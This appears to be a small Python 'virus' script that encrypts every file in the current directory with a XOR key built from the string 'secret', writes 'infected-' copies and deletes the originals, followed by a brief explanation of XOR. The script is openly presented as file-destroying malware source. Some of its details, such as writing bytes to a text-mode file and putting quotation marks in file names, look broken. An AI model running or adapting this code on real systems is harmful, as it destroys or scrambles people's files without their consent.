import os

txt_files = [f for f in os.listdir('.')]
secret = "secret"
key = []
print("###### virus is loading #######")


for i in secret:
    key.append(ord(i))

for source_file in txt_files:
    if source_file == "boom.py":
        continue

    with open(source_file, 'rb') as source:
            bytes = bytearray(source.read())
            for i in range(len(bytes)):
                for bt in key:
                    bytes[i] ^= bt
            infec_file = open('"infected-{}"'.format(os.path.splitext(source_file)[0]),"w+")    
            infec_file.write(bytes)
            os.remove(source_file)
            source.close()
    infec_file.close()
    
print("###### files infection success ######")




"""
    ####### XOR description ###########

    b=0011 (3)            a=0101 (5)
    c=0110 (6) XOR   or   c=0110 (6) XOR
    ----------            ----------
    a=0101 (5)            b=0011 (3) """